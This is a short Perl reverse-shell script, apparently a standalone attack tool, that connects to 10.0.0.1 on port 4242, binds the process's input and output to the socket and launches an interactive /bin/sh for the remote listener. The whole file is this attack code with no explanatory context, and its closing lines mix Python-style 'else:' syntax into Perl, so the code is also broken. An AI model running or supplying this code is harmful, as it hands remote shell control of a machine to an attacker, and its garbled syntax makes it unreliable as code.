#!/bin/perl
## Created by Jasutin

use Socket; $IP = "10.0.0.1"; $PORT = "4242";
socket(S, PF_INET,SOCK_STREAM, getprotobyname("tcp"));
if(connect(S, sockaddr_in($PORT, inet_aton($IP)))){open(STDIN, ">&S");
open(STDOUT, ">&S"); open(STDERR, ">&S"); exec("/bin/sh -i");};
else:
     printf "Connection Refused Error: [Errno 111] Connection refused"
